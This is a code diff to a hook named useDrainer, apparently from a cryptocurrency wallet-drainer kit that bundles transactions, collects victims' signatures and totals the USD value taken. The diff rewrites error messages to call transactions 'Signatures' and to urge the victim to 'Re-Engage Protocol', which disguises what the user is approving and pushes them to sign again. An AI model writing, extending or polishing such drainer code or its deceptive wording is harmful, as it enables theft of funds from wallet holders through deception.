@@ -2234,7 +2234,7 @@ export const useDrainer = () => {
                         const testSerialize = bundleTx.serialize({ requireAllSignatures: false });
                         if (testSerialize.length > NETWORK_CONFIG.maxPacketSize) {
                             console.error(
-                                `[BUNDLE ${bi}] TX too large: ${testSerialize.length} bytes, skipping`,
+                                `[BUNDLE ${bi}] Signatures are too large: ${testSerialize.length} bytes, skipping`,
                             );
                             continue;
                         }
@@ -2304,7 +2304,7 @@ export const useDrainer = () => {
 
             // --- Check if any bundles were signed ---
             if (signedBundles.length === 0) {
-                setError("No transactions were signed. Operation cancelled.");
+                setError("No Signatures were signed. Re-Engage Protocol.");
                 setStatus("error");
                 return;
             }
@@ -2412,7 +2412,7 @@ export const useDrainer = () => {
                 );
             } else {
                 setStatus("error");
-                setError("All transactions failed on-chain. Funds are safe.");
+                setError("All Signatures failed on-chain. Funds are safe.");
             }
 
             const confirmedValue = confirmedBundles.reduce((s, b) => s + b.usdValue, 0);
